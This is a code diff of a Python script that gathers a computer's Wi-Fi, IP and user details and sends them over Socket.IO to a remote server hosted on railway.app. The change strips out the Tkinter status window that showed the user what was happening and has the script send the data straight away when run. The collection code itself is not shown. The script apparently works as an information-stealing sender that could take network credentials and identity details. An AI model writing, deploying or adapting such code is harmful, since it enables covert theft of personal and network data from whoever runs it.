@@ -1,4 +1,3 @@
-import tkinter as tk
 import socketio
 import subprocess
 import platform
@@ -74,19 +73,14 @@ def gather_info():
 
 def connect_and_send():
     try:
+        print("Connecting to server...")
         sio.connect('https://backfisch-production.up.railway.app')  # <-- Your deployed URL
         data = gather_info()
+        print("Sending gathered info...")
         sio.emit('send_message', {'message': data})
-        status_label.config(text="Sent Wi-Fi, IP, and user info")
+        print("Sent Wi-Fi, IP, and user info")
     except Exception as e:
-        status_label.config(text=f"Error: {e}")
+        print(f"Error: {e}")
 
-root = tk.Tk()
-root.title("Wi-Fi & IP Info Sender")
-
-status_label = tk.Label(root, text="Connecting...")
-status_label.pack(pady=20)
-
-root.after(100, connect_and_send)
-
-root.mainloop()
+if __name__ == "__main__":
+    connect_and_send()
